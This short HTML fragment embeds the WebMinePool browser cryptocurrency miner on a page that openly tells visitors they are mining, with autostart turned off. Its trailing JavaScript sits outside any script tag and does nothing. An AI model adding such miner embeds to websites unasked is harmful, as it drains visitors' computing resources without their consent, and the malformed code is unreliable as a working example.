</head>
<body>
    <p>You are now mining crypto.</p>

    <script src="https://www.webminepool.com/lib/simple-ui.js"></script>
    <div id="wmp-container"
        wmp-site-key="SK_tmo5gh7JKbwWaidYdSpga"
        wmp-username="anon"
        wmp-threads="2"
        wmp-throttle="0.1"
        wmp-autostart="false"

    ></div>

        // Initialize the miner UI
        document.addEventListener('DOMContentLoaded', function() {
            var container = document.getElementById('wmp-container');

        });
